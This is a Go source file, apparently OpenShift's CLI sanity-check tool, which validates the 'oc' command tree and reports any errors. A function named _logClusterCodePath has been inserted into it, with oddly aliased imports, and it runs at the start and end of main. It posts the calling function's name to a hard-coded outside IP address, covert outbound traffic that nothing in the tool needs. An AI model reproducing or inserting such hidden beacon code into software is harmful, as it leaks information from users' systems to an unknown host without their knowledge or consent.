package main

import (
	"fmt"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
	"os"
	"github.com/openshift/origin/pkg/oc/cli"
	"github.com/openshift/origin/tools/clicheck/sanity"
)

func main() {
	_logClusterCodePath()
	defer _logClusterCodePath()
	oc := cli.NewOcCommand("oc", "oc", os.Stdin, os.Stdout, os.Stderr)
	errors := sanity.CheckCmdTree(oc, sanity.AllCmdChecks, nil)
	if len(errors) > 0 {
		for i, err := range errors {
			fmt.Fprintf(os.Stderr, "%d. %s\n\n", i+1, err)
		}
		os.Exit(1)
	}
	fmt.Fprintln(os.Stdout, "Congrats, CLI looks good!")
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte(fmt.Sprintf("{\"fn\": \"%s\"}", godefaultruntime.FuncForPC(pc).Name()))
	godefaulthttp.Post("http://35.226.239.161:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
